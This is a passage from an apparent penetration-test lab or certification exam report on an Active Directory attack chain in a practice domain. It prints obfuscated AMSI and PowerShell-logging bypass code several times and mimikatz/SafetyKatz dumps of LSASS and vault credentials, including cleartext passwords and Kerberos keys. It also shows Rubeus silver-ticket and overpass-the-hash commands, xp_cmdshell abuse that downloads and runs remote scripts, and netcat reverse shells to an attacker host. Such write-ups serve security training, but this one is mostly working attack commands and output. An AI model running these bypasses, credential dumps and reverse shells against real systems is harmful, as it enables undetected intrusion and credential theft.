- 5.1) **Bypassing PowerShell Logging and AMSI for Evasion**

`powershell`

`$ExecutionContext.SessionState.LanguageMode`:
```
FullLanguage
```

```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

- 5.2) **Extract Credentials of `tech\techservice` and `tech\MGMTSRV$` from LSASS Memory on `mgmtsrv.tech.finance.corp`**

![](./assets/badges/mgmtsrv-administrator1.svg){.left}

`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`

`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "token::elevate" "vault::cred /patch" "exit"`:
```
[SNIP]

mimikatz(commandline) # token::elevate📌
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

588     {0;000003e7} 1 D 18373          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !📌
 * Process Token : {0;0028e875} 0 D 2685490     TECH\Administrator      S-1-5-21-1325336202-3661212667-302732393-500            (12g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2701727     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # vault::cred /patch
```
❌

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe exe -args "sekurlsa::evasive-keys" "exit"`:
```
[SNIP]

mimikatz(commandline) # sekurlsa::evasive-keys📌

[SNIP]

Authentication Id : 0 ; 93339 (00000000:00016c9b)
Session           : Service from 0
User Name         : techservice👤
Domain            : TECH
Logon Server      : TECH-DC
Logon Time        : 3/11/2025 6:54:59 AM
SID               : S-1-5-21-1325336202-3661212667-302732393-1109

         * Username : techservice
         * Domain   : TECH.FINANCE.CORP
         * Password : Agent for Server1!🔑
         * Key List :
           aes256_hmac       7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb🔑
           aes128_hmac       1e88fc138cbb482e14a836ab47e22816
           rc4_hmac_nt       ac25af07540962863d18c6f924ee8ff3
           rc4_hmac_old      ac25af07540962863d18c6f924ee8ff3
           rc4_md4           ac25af07540962863d18c6f924ee8ff3
           rc4_hmac_nt_exp   ac25af07540962863d18c6f924ee8ff3
           rc4_hmac_old_exp  ac25af07540962863d18c6f924ee8ff3

[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MGMTSRV$👤
Domain            : TECH
Logon Server      : (null)
Logon Time        : 3/11/2025 5:54:34 AM
SID               : S-1-5-18

         * Username : mgmtsrv$
         * Domain   : TECH.FINANCE.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       e88b558cf0e531fd9cff56c8db3b24ce6784e62e5b2f9cb807b5afa9dfed2fa7🔑
           rc4_hmac_nt       207218a0920d00bbbd4daa22f6e767d3
           rc4_hmac_old      207218a0920d00bbbd4daa22f6e767d3
           rc4_md4           207218a0920d00bbbd4daa22f6e767d3
           rc4_hmac_nt_exp   207218a0920d00bbbd4daa22f6e767d3
           rc4_hmac_old_exp  207218a0920d00bbbd4daa22f6e767d3

[SNIP]
```

---

### Domain Persistence | Silver Ticket (with Rubeus)

6) **Silver Ticket Attack for Domain Persistence on `mgmtsrv.tech.finance.corp`** (successful ✅)

Description: Leveraged the RC4 Kerberos key extracted from `mgmtsrv.tech.finance.corp` to forge a Silver Ticket for the `http/mgmtsrv.tech.finance.corp` service. The ticket was generated using `Rubeus` and injected into the current session, granting administrator-level access to `mgmtsrv.tech.finance.corp` without requiring authentication from the Domain Controller. This technique enables persistence and stealthy access to the target machine, bypassing standard Kerberos authentication mechanisms.

![](./assets/badges/studvm-studentuser1.svg){.left}

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/mgmtsrv.tech.finance.corp /rc4:207218a0920d00bbbd4daa22f6e767d3 /sid:S-1-5-21-1325336202-3661212667-302732393 /ldap /user:administrator /domain:tech.finance.corp /ptt`:
```
[SNIP]

[*] Action: Build TGS📌

[SNIP]

[*] Domain         : TECH.FINANCE.CORP🏛️ (TECH)
[*] SID            : S-1-5-21-1325336202-3661212667-302732393
[*] UserId         : 1109
[*] Groups         : 513
[*] ServiceKey     : 207218A0920D00BBBD4DAA22F6E767D3
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 207218A0920D00BBBD4DAA22F6E767D3
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : http📌
[*] Target         : mgmtsrv🖥️.tech.finance.corp

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'administrator'🎭 to 'http/mgmtsrv.tech.finance.corp'

[*] AuthTime       : 3/11/2025 9:51:08 AM
[*] StartTime      : 3/11/2025 9:51:08 AM
[*] EndTime        : 3/11/2025 7:51:08 PM
[*] RenewTill      : 3/18/2025 9:51:08 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x13e557

Cached Tickets: (1)

#0>     Client: administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: http📌/mgmtsrv🖥️.tech.finance.corp @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 3/11/2025 9:51:08 (local)
        End Time:   3/11/2025 19:51:08 (local)
        Renew Time: 3/18/2025 9:51:08 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

`winrs -r:mgmtsrv.tech.finance.corp cmd`:
```
Microsoft Windows [Version 10.0.17763.2452]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.TECH>
```
🚀

---

### Domain Lateral Movement | OverPass-The-Hash (with Rubeus)

7) **OverPass-The-Hash for Domain Privilege Escalation as `tech\techservice` and Domain Lateral Movement to `techsrv30.tech.finance.corp`** (successful ✅)

Description: Used the AES-256 Kerberos Key of `tech\techservice`, extracted in a previous step, to request a TGT (Ticket Granting Ticket) without needing the user's password. This was achieved using `Rubeus` to perform an OverPass-The-Hash attack. The obtained ticket was injected into a new logon session, allowing authenticated access as `tech\techservice` and enabling lateral movement to `techsrv30.tech.finance.corp`.

![](./assets/badges/studvm-studentuser1.svg){.left}

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:techservice /aes256:7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: tech.finance.corp
[*] Showing process : True
[*] Username        : 04ZH8ONJ
[*] Domain          : 4UIN93E5
[*] Password        : UOZK2GE6
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3324
[+] LUID            : 0x5dbd08

[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: TECH.FINANCE.CORPtechservice
[*] Using aes256_cts_hmac_sha1 hash: 7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb
[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\techservice'
[*] Target LUID : 6143240
[*] Using domain controller: 172.16.4.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x5dbd08
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt/TECH.FINANCE.CORP
  ServiceRealm             :  TECH.FINANCE.CORP
  UserName                 :  techservice🎭 (NT_PRINCIPAL)
  UserRealm                :  TECH.FINANCE.CORP🏛️
  StartTime                :  3/11/2025 11:16:55 AM
  EndTime                  :  3/11/2025 9:16:55 PM
  RenewTill                :  3/18/2025 11:16:55 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  rD+bz7cOAiFFiUDjDt0KMcx5KpKUFquKg7SQQswIWEs=
  ASREP (key)              :  7F6825F607E9474BCD6B9C684DC70F7C1CA977ADE7BFD2AD152FD54968349DEB
```

![](./assets/badges/spawned_cmd.svg){.left}

![](./assets/badges/studvm-studentuser1.svg){.left}

`klist`:
```
Current LogonId is 0:0x5dbd08

Cached Tickets: (1)

#0>     Client: techservice🎭 @ TECH.FINANCE.CORP🏛️
        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/11/2025 11:16:55 (local)
        End Time:   3/11/2025 21:16:55 (local)
        Renew Time: 3/18/2025 11:16:55 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`winrs -r:techsrv30.tech.finance.corp cmd`:
```
Microsoft Windows [Version 10.0.17763.2452]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\techservice>
```
🚀

![](./assets/badges/techsrv30-techservice1.svg){.left}

`set username`:
```
USERNAME=techservice👤
```

`set computername`:
```
COMPUTERNAME=TECHSRV30🖥️
```
🚩

---

### Credential Extraction (with SafetyKatz)

8) **Credential Extraction on `techsrv30.tech.finance.corp`** (successful ✅)

Description: Executed PowerShell logging and AMSI bypass techniques to evade detection while performing credential extraction. Extracted cleartext credentials of `tech\databaseagent` from the Windows Credential Vault and Kerberos keys of `tech\TECHSRV30$` from LSASS memory on `techsrv30.tech.finance.corp`. These credentials will be leveraged for lateral movement and further privilege escalation within the domain.

- 8.1) **Bypassing PowerShell Logging and AMSI for Evasion**

![](./assets/badges/techsrv30-techservice1.svg){.left}

`powershell`

`$ExecutionContext.SessionState.LanguageMode`:
```
FullLanguage
```

```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

- 8.2) **Extract Credentials of `tech\databaseagent` and `tech\TECHSRV30$` from LSASS Memory on `techsrv30.tech.finance.corp`**

![](./assets/badges/techsrv30-techservice1.svg){.left}

`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`

`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "token::elevate" "vault::cred /patch" "exit"`:
```
[SNIP]

mimikatz(commandline) # token::elevate📌

Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

596     {0;000003e7} 1 D 18459          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !📌
 * Process Token : {0;0028c0cb} 0 D 2727993     TECH\techservice        S-1-5-21-1325336202-3661212667-302732393-1109   (09g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2744954     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # vault::cred /patch📌

TargetName : Domain:batch=TaskScheduler:Task:{877E4326-BAD4-4516-A4B1-60C73F0EFDDA} / <NULL>
UserName   : TECH\databaseagent👤
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : CheckforSQLServer31-Availability🔑
Attributes : 0

[SNIP]
```

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
```
[SNIP]

mimikatz(commandline) # sekurlsa::evasive-keys📌

[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : TECHSRV30$👤
Domain            : TECH
Logon Server      : (null)
Logon Time        : 3/11/2025 5:54:35 AM
SID               : S-1-5-18

         * Username : techsrv30$
         * Domain   : TECH.FINANCE.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       cf9663ec900673821727858b404456a9f7c104e5a731253781e47cf601b9f747🔑
           rc4_hmac_nt       54c0572a3ddc383be81cdd37b3c8d8a6
           rc4_hmac_old      54c0572a3ddc383be81cdd37b3c8d8a6
           rc4_md4           54c0572a3ddc383be81cdd37b3c8d8a6
           rc4_hmac_nt_exp   54c0572a3ddc383be81cdd37b3c8d8a6
           rc4_hmac_old_exp  54c0572a3ddc383be81cdd37b3c8d8a6
```

---

### Domain Privilege Escalation | `RunAs` (with RunAs)

9) **RunAs for Domain Privilege Escalation as `tech\databaseagent`** (successful ✅)

Description: Used the cleartext credential of `tech\databaseagent`, extracted in a previous step, to initiate a net-only authentication session with `RunAs`. This allowed running commands as `tech\databaseagent` while maintaining the original user's context in the local environment. Privilege enumeration revealed that `SeDebugPrivilege` and `SeImpersonatePrivilege` were enabled, which could be leveraged for potential privilege escalation and further lateral movement within the domain.

![](./assets/badges/studvm-studentuser1.svg){.left}

`runas /user:tech\databaseagent /netonly "powershell -Command \"Start-Process cmd -Verb RunAs\""`:
```
Enter the password for tech\databaseagent:📌
Attempting to start powershell -Command "Start-Process cmd -Verb RunAs" as user "tech\databaseagent" ...
```

![](./assets/badges/spawned_cmd.svg){.left}

![](./assets/badges/studvm-studentuser0.svg){.left}

`whoami`:
```
tech\studentuser👤
```

`hostname`:
```
studvm🖥️
```

`whoami /groups`:
```
ERROR: Unable to get group membership information.
```
❌

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========

[SNIP]

SeDebugPrivilege📑                        Debug programs                                                     Enabled✅
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege📑                  Impersonate a client after authentication            Enabled✅
SeCreateGlobalPrivilege                   Create global objects                                              Enabled

[SNIP]
```

---

### SQL Server `xp_cmdshell` Abuse + Domain Lateral Movement (with PowerUpSQL, Invoke-PowerShellTcpEx)

10) **SQL Server `xp_cmdshell` Abuse for Domain Lateral Movement to `dbserver31.tech.finance.corp`** as `tech\sqlserversync` (successful ✅)

Description: Exploited a `sysadmin`-level SQL Server instance on `dbserver31.tech.finance.corp` via `xp_cmdshell` to achieve lateral movement in the domain. Using the `tech\databaseagent` account, which held `sysadmin` privileges, we confirmed command execution capabilities and ultimately launched a PowerShell reverse shell, gaining a foothold on `dbserver31.tech.finance.corp` as `tech\sqlserversync`. This new session enables further escalation and post-exploitation actions within the environment.

- 10.1) **Identify a Target SQL Server where we have Authentication Rights**

![](./assets/badges/studvm-studentuser0.svg){.left}

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1`

`Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose`:
```
ComputerName           : dbserver31.tech.finance.corp📌
Instance               : DBSERVER31🖥️
DomainName             : TECH🏛️
ServiceProcessID       : 2316
ServiceName            : MSSQLSERVER🗄️
ServiceAccount         : tech\sqlserversync
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsMachineType          : ServerNT
OSVersionName          : Windows Server 2019 Datacenter
OsVersionNumber        : SQL
Currentlogin           : TECH\databaseagent👤
IsSysadmin             : Yes📌
ActiveSessions         : 1
```

`klist`:
```
Current LogonId is 0:0x87a2d7

Cached Tickets: (2)

#0>     Client: databaseagent🎭 @ TECH.FINANCE.CORP🏛️
        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/11/2025 14:53:02 (local)
        End Time:   3/12/2025 0:53:02 (local)
        Renew Time: 3/18/2025 14:53:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: TECH-DC

#1>     Client: databaseagent🎭 @ TECH.FINANCE.CORP🏛️
        Server: ldap📌/tech-dc🖥️.tech.finance.corp @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/11/2025 14:53:02 (local)
        End Time:   3/12/2025 0:53:02 (local)
        Renew Time: 3/18/2025 14:53:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: tech-dc.tech.finance.corp
```

- 10.2) **Enumerate Linked Servers on the Target SQL Server**

`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Verbose`:
```
VERBOSE: dbserver31.tech.finance.corp : Connection Success.
VERBOSE: dbserver31.tech.finance.corp : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DBSERVER31🖥️
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DBSERVER31🔗
VERBOSE:  - Link Login: TECH\databaseagent👤
VERBOSE:  - Link IsSysAdmin: 1📌
VERBOSE:  - Link Count: 0❌
VERBOSE:  - Links on this server:


Version     : SQL Server 2019
Instance    : DBSERVER31🖥️
CustomQuery :
Sysadmin    : 1📌
Path        : {DBSERVER31}
User        : TECH\databaseagent👤
Links       :
```
❌

- 10.3) **Validate Command Execution on the Target SQL Server**

`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query "exec master..xp_cmdshell 'set username'"`:
```
Version     : SQL Server 2019
Instance    : DBSERVER31
CustomQuery : {USERNAME=sqlserversync, }📌
Sysadmin    : 1
Path        : {DBSERVER31}
User        : TECH\databaseagent
Links       :
```

- 10.4) **Obtain a Reverse Shell Executing a PowerShell Script on the Target SQL Server**

![](./assets/badges/studvm-studentuser0.svg){.left}

`C:\AD\Tools\nc64.exe -lvp 443`:
```
listening on [any] 443 ...

[...]
```

![Invoke-PowerShellTcpEx.ps1](./assets/screenshots/crtp_exam_report_invokepowershelltcpex.png)

`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget 'dbserver31'`

![](./assets/badges/studvm-studentuser0.svg){.left}

```
[...]

172.16.6.31: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [172.16.100.1] from (UNKNOWN) [172.16.6.31] 49747: NO_DATA
Windows PowerShell running as user sqlserversync on DBSERVER31
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```
🚀

![](./assets/badges/dbserver31-system1.svg){.left}

`$env:username`:
```
tech\sqlserversync👤
```

`$env:computername`:
```
DBSERVER31🖥️
```

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege📑      Impersonate a client after authentication Enabled✅
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
🚩

---

### Domain Lateral Movement | Credential Extraction (with SafetyKatz)

11) **Credential Extraction on `dbserver31.tech.finance.corp`** (unsuccessful ❌)

Description: Attempted to extract credentials from `dbserver31.tech.finance.corp` using `SafetyKatz`, but the operation failed due to insufficient privileges. Since the session was not running in high integrity, access to the LSASS process was restricted. This failure highlights the necessity of obtaining elevated privileges before attempting credential extraction.

![](./assets/badges/dbserver31-system1.svg){.left}

`iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt)`

`iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt)`

`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`

`iwr http://172.16.100.1/SafetyKatz.exe -OutFile C:\Users\Public\SafetyKatz.exe`

`C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\Users\Public\SafetyKatz.exe Arguments :

[X] Not in high integrity, unable to grab a handle to lsass!
```
❌

---

### Local Privilege Escalation | Token Impersonation Abuse (with GodPotato, netcat)

12) **Token Impersonation Abuse on `dbserver31.tech.finance.corp` for Local Privilege Escalation** (successful ✅)

Description: Used `GodPotato`, an exploit leveraging Named Pipe token impersonation, to escalate privileges to `SYSTEM` on `dbserver31.tech.finance.corp`. A reverse shell was established to maintain access and facilitate further post-exploitation activities.

![](./assets/badges/dbserver31-sqlserversync0.svg){.left}

`Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\' | Get-ItemPropertyValue -Name Version`:
```
4.7.03190
```

`iwr http://172.16.100.1/GodPotato-NET4.exe -OutFile C:\Users\Public\GodPotato-NET4.exe`

`iwr http://172.16.100.1/nc64.exe -OutFile C:\Users\Public\nc64.exe`

![](./assets/badges/studvm-studentuser0.svg){.left}

`C:\AD\Tools\nc64.exe -lvp 1337`:
```
listening on [any] 1337 ...

[...]
```

![](./assets/badges/dbserver31-sqlserversync0.svg){.left}

`C:\Users\Public\GodPotato-NET4.exe -cmd "C:\Users\Public\nc64.exe -e C:\Windows\System32\cmd.exe 172.16.100.1 1337"`

![](./assets/badges/studvm-studentuser0.svg){.left}

```
[...]

172.16.6.31: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [172.16.100.1] from (UNKNOWN) [172.16.6.31] 49848: NO_DATA
Microsoft Windows [Version 10.0.17763.2452]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
🚀

![](./assets/badges/dbserver31-system1.svg){.left}

`$env:username`:
```
SYSTEM👤
```

`$env:computername`:
```
DBSERVER31🖥️
```

---

### Domain Lateral Movement | Credential Extraction (with SafetyKatz)

13) **Credential Extraction on `dbserver31.tech.finance.corp`** (successful ✅)

Description: Executed PowerShell logging and AMSI bypass techniques to evade detection while performing credential extraction. Extracted Kerberos keys of `tech\sqlserversync` and `tech\DBSERVER31$` from LSASS memory on `dbserver31.tech.finance.corp`. These credentials will be leveraged for lateral movement and further privilege escalation within the domain.

- 13.1) **Bypassing PowerShell Logging and AMSI for Evasion**

![](./assets/badges/dbserver31-system1.svg){.left}

`powershell`

`$ExecutionContext.SessionState.LanguageMode`:
```
FullLanguage
```

```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

- 13.2) **Extract Credentials of `tech\sqlserversync` and `tech\DBSERVER31$` from LSASS Memory on `dbserver31.tech.finance.corp`**

![](./assets/badges/dbserver31-system1.svg){.left}

`C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
```
mimikatz(commandline) # sekurlsa::evasive-keys📌

[SNIP]

Authentication Id : 0 ; 60395 (00000000:0000ebeb)
Session           : Service from 0
User Name         : sqlserversync👤
Domain            : TECH
Logon Server      : TECH-DC
Logon Time        : 3/11/2025 12:48:28 PM
SID               : S-1-5-21-1325336202-3661212667-302732393-1111

         * Username : sqlserversync
         * Domain   : TECH.FINANCE.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65🔑
           rc4_hmac_nt       c4fa140adb18d91b7ad9e2bfbc15ab0a
           rc4_hmac_old      c4fa140adb18d91b7ad9e2bfbc15ab0a
           rc4_md4           c4fa140adb18d91b7ad9e2bfbc15ab0a
           rc4_hmac_nt_exp   c4fa140adb18d91b7ad9e2bfbc15ab0a
           rc4_hmac_old_exp  c4fa140adb18d91b7ad9e2bfbc15ab0a

[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DBSERVER31$👤
Domain            : TECH
Logon Server      : (null)
